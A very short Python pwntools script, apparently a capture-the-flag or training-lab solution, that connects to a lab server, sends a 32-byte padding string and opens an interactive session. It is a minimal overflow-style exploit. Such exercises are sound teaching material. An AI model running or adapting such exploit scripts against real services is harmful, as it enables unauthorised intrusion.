from pwn import *

r = remote('lab.scist.org', 13373)

r.sendline(b'b' * 0x20)

r.interactive()